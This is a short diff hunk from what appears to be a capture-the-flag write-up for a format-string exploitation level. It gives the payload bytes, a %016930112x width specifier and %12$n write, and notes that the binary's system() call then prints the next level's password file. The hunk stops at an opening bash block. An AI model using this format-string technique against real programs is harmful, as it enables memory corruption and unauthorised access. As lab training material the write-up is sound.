@@ -23,7 +23,7 @@ n:
 - payload: `\x10\x98\x04\x08` + `%016930112x` + `%12$n`.
   width = 16,930,116 − addr 4 = **16,930,112** → `%016930112x`.
   `%016930112x` is a **width specifier** (input ~12B) that only produces ~16M output chars →
-  unrelated to the fgets 0x200 cap.
+  unrelated to the fgets 0x200 cap. (Binary asked value)
 - Delivery: `system(0x8048590)` = via `x/s` is `/bin/cat .../level5/.pass` → a **one-shot
   command**, so no cat - trick; a plain pipe prints the pass.
 ```bash
